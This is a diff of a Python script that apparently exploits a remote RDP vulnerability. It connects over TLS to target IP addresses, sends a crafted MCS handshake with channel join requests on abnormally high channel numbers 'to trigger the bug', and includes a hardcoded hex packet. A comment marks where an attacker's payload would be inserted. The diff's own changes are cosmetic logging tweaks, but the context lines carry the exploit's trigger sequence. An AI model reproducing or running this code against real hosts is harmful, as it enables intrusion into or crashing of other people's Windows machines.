@@ -237,6 +237,8 @@ GIS_RDP = []
 TPDU_CONNECTION_REQUEST = 0xe0
 TYPE_RDP_NEG_REQ = 1
 PROTOCOL_SSL = 1
+SENT = "\033[91m -->\033[0m"
+RECEIVE = "\033[94m<-- \033[0m"
 
 
 def info(string):
@@ -297,37 +299,37 @@ def start_rdp_connection(ip_addresses):
             tls.do_handshake()
 
             # initialization packets (X.224)
-            info("sending Client MCS Connect Initial PDU request packet -->")
+            info("sending Client MCS Connect Initial PDU request packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().mcs_connect_init_pdu())
             returned_packet = tls.recv(8000)
-            info("<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))
 
             # erect domain and attach user to domain
-            info("sending Client MCS Domain Request PDU packet -->")
+            info("sending Client MCS Domain Request PDU packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().domain_request_pdu())
-            info("sending Client MCS Attach User PDU request packet -->")
+            info("sending Client MCS Attach User PDU request packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().mcs_attach_user_request_pdu())
             returned_packet = tls.recv(8000)
-            info("<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))
 
             # send join requests on ridiculously high channel numbers to trigger the bug
-            info("sending MCS Channel Join Request PDU packets -->")
+            info("sending MCS Channel Join Request PDU packets {}".format(SENT))
             pdus = DoPduConnectionSequence().do_join_request()
             for pdu in pdus:
                 tls.sendall(pdu)
                 channel_number = int(Packer(pdu).bin_pack()[-4:], 16)
                 returned_packet = tls.recv(1024)
-                info("<-- received {} bytes from channel {} on host: {}".format(
-                    hex(len(returned_packet)), channel_number, ip
+                info("{} received {} bytes from channel {} on host: {}".format(
+                    RECEIVE, hex(len(returned_packet)), channel_number, ip
                 ))
 
             # my personal favorite is the security exchange, took me awhile to figure this one out
-            info("sending Client Security Exhcange PDU packets -->")
+            info("sending Client Security Exhcange PDU packets {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().do_client_security_pdu_exchange())
             tls.sendall(DoPduConnectionSequence().client_info_pdu())
             returned_packet = tls.recv(8000)
-            info("<-- received {} bytes from host: {}".format(
-                hex(len(returned_packet)), ip
+            info("{} received {} bytes from host: {}".format(
+                RECEIVE, hex(len(returned_packet)), ip
             ))
 
             # confirm that the client is now active
@@ -346,24 +348,24 @@ def start_rdp_connection(ip_addresses):
                 "ea19c54053100310000000100000025000000c0cb080000000100c1cb1d00000001c0cf020008000001400002010101000140"
                 "0002010104"
             )
-            info("sending Client Confirm Active PDU packet -->")
+            info("sending Client Confirm Active PDU packet {}".format(SENT))
             tls.sendall(Packer(confirm_packet).bin_unpack())
             returned_packet = tls.recv(1024)
-            info("<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))
 
             # finish the connection sequence
-            info("sending Client Synchronization PDU packet -->")
+            info("sending Client Synchronization PDU packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().client_synchronization_pdu())
-            info("sending Client Control Cooperate PDU packet -->")
+            info("sending Client Control Cooperate PDU packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().client_control_cooperate_pdu())
-            info("sending Client Control Request PDU packet -->")
+            info("sending Client Control Request PDU packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().client_control_request_pdu())
-            info("sending Client Persistent Key Length PDU packet -->")
+            info("sending Client Persistent Key Length PDU packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().client_persistent_key_length_pdu())
-            info("sending Client Font List PDU packet -->")
+            info("sending Client Font List PDU packet {}".format(SENT))
             tls.sendall(DoPduConnectionSequence().client_font_list_pdu())
             returned_packet = tls.recv(8000)
-            info("<-- received {} bytes from host: {}".format(hex(len(returned_packet)), ip))
+            info("{} received {} bytes from host: {}".format(RECEIVE, hex(len(returned_packet)), ip))
 
             # As much as I don't condone hacking and breaking into things.
             # If you're going to do it, this is where you would put your payload of types.
